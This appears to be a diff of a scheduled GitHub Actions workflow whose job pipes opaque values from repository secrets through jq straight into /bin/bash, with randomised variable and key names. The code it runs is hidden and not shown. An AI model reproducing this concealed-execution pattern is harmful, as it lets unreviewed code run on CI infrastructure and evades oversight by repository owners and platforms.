@@ -3,24 +3,35 @@ name: mazhengfu4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 3/6 * * *'
-jobs:  # 31100
+    - cron: '48 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mazhengfu4567
         env:
-          mkx941: ${{ secrets.mkx941 }}
+          xywzz8: ${{ secrets.xywzz8 }}
         run: |
-          echo $mkx941 | jq -r .bfjps1 | /bin/bash
-          echo $dm9459 | jq -r .q76 | /bin/bash
-          echo $wpujq4087 | jq -r .shnj760 | /bin/bash
-          echo $jeanb2 | jq -r .eq6023 | /bin/bash
-          echo $dq97065 | jq -r .eqngq116 | /bin/bash
-          echo $i268 | jq -r .fmt2 | /bin/bash
-          echo $qs3 | jq -r .f48 | /bin/bash
-          echo $zindd97161 | jq -r .ubjal311 | /bin/bash
-          echo $g8766 | jq -r .ubvvh0 | /bin/bash
+          echo $xywzz8 | jq -r .nuaf6 | /bin/bash
+          echo $zcym493 | jq -r .h6082 | /bin/bash
+          echo $hfqvq65271 | jq -r .c1 | /bin/bash
+          echo $izi08703 | jq -r .ofwi2902 | /bin/bash
+          echo $zao305 | jq -r .vuxrx1 | /bin/bash
+          echo $gev351 | jq -r .rnq52317 | /bin/bash
+          echo $gsh2608 | jq -r .i33 | /bin/bash
+          echo $yil5 | jq -r .c85343 | /bin/bash
+          echo $hl025 | jq -r .xkq53476 | /bin/bash
+          echo $wvne2521 | jq -r .f904 | /bin/bash
+          echo $i385 | jq -r .mtzkt6236 | /bin/bash
+          echo $yyj285 | jq -r .bess2025 | /bin/bash
+          echo $xmxkw1760 | jq -r .pfvh9754 | /bin/bash
+          echo $pa8 | jq -r .gth05751 | /bin/bash
+          echo $ik75522 | jq -r .qfk8770 | /bin/bash
+          echo $p972 | jq -r .oy268 | /bin/bash
+          echo $a00584 | jq -r .cl01 | /bin/bash
+          echo $ln2 | jq -r .x5 | /bin/bash
+          echo $iq288 | jq -r .x2622 | /bin/bash
+          echo $zwbi5736 | jq -r .lqme8707 | /bin/bash
 
